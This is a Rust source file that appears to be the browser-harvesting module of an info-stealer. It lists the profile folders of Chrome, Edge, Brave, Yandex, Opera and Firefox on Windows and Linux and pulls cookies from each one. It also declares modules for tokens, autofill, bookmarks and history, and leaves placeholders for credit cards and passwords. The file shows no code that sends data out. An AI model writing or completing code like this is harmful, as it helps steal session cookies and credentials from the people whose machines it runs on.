mod autofill;
mod bookmarks;
mod cookies;
mod history;
mod token;
// credit cards
// passwords

use std::path::PathBuf;

pub async fn get_browser() {
    let mut browser_root = get_browser_root_paths();

    for entry in browser_root.iter_mut() {
        cookies::get_cookies(entry).await;
        // token::get_token(entry);
        // autofill::get_autofill(entry);
        // bookmarks::get_bookmarks(entry);
        // history::get_history(entry);
    }
}

pub fn get_browser_root_paths() -> Vec<PathBuf> {
    let mut browser_root;

    if cfg!(target_os = "windows") {
        browser_root = Vec::with_capacity(8);
        let local = std::env::var("LOCALAPPDATA").unwrap();
        let roaming = std::env::var("APPDATA").unwrap();

        browser_root.push(PathBuf::from(format!("{local}/Google/Chrome/User Data"))); // Google Chrome
        browser_root.push(PathBuf::from(format!("{local}/Microsoft/Edge/User Data"))); // Microsoft Edge
        browser_root.push(PathBuf::from(format!(
            "{local}/BraveSoftware/Brave-Browser/User Data"
        ))); // Brave Browser
             // browser_root.push(PathBuf::from(format!(""))), // Web Explorer
             // browser_root.push(PathBuf::from(format!(""))), // Firefox
        browser_root.push(PathBuf::from(format!(
            "{local}/Yandex/YandexBrowser/User Data"
        ))); // Yandex
        browser_root.push(PathBuf::from(format!(
            "{roaming}/Opera Software/Opera GX Stable"
        ))); // Opera GX Browser
        browser_root.push(PathBuf::from(format!(
            "{roaming}/Opera Software/Opera Stable"
        ))); // Opera Browser
    } else {
        // for linux
        browser_root = vec![PathBuf::from(std::env::var("HOME").unwrap()); 7];

        browser_root[0].push(".mozilla/firefox"); // Firefox
        browser_root[1].push(".config/BraveSoftware/Brave-Browser");
        // browser_root[2].push(""); // Chromium
        // browser_root[2].push(""); // Google Chrome
        // browser_root[3].push(""); // Microsoft Edge
        // browser_root[5].push(""); // Yandex
        // browser_root[6].push(""); // Opera
    }

    // for macos
    // for android
    // for ios

    browser_root
}
